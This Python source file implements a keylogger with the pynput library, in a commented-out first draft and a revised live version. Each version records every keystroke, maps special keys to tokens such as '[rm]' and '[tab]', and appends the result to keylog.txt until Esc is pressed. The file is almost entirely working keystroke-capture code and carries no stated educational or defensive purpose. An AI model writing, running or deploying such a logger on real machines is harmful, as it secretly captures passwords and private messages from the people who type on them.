# from pynput import keyboard
# import time

# logfile = "keylog.txt"

# def write_log(logfile, log):
#     with open(logfile, "a") as writer:
#         writer.write(log)

# def on_press(key):
#     try:
#         log = ""
#         if key == keyboard.Key.backspace:
#             log = "[B]"
#         elif key == keyboard.Key.enter:
#             log = "\n"
#         elif key == keyboard.Key.space:
#             log = " "
#         elif key == keyboard.Key.esc:
#             log = "\n=========================================\nExiting"
#             return False
#         else:
#             log = str(key).replace("'", "")

#         write_log(logfile, log)

#     except Exception as e:
#         print("[ERROR] An error occurred:", str(e))

# def on_release(key):
#     if key == keyboard.Key.esc:
#         print('Exiting...')
#         return False

# if __name__ == "__main__":
#     print("[+] Keylogger started")
#     curr_time = time.ctime(time.time())
#     write_log(logfile, f"logs created on {curr_time}\n")
#     write_log(logfile, "=========================================================\n")

#     try:
#         with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
#             listener.join()
#     except KeyboardInterrupt:
#         print("[+] Exiting")



from pynput import keyboard
import time

logfile = "keylog.txt"

def write_log(logfile, log):
    with open(logfile, "a") as writer:
        writer.write(log)

def convert_key_to_readable_string(key):
    if isinstance(key, keyboard.Key):
        if key == keyboard.Key.backspace:
            return "[rm]"
        elif key == keyboard.Key.delete:
            return "[del]"
        elif key == keyboard.Key.tab:
            return "[tab]"
        elif key == keyboard.Key.caps_lock:
            return "[caps]"
        elif key == keyboard.Key.shift:
            return ""
        elif key == keyboard.Key.enter:
            return "\n"
        elif key == keyboard.Key.space:
            return " "
        elif key == keyboard.Key.esc:
            return "\n=========================================\nExiting"
    return str(key).replace("'", "")

def on_press(key):
    try:
        log = convert_key_to_readable_string(key)
        write_log(logfile, log)
    except Exception as e:
        print("[ERROR] An error occurred:", str(e))

def on_release(key):
    if key == keyboard.Key.esc:
        print('Exiting...')
        return False

if __name__ == "__main__":
    print("[+] Keylogger started")
    curr_time = time.ctime(time.time())
    write_log(logfile, f"Logs created on {curr_time}\n")
    write_log(logfile, "=========================================================\n")

    try:
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("[+] Exiting")
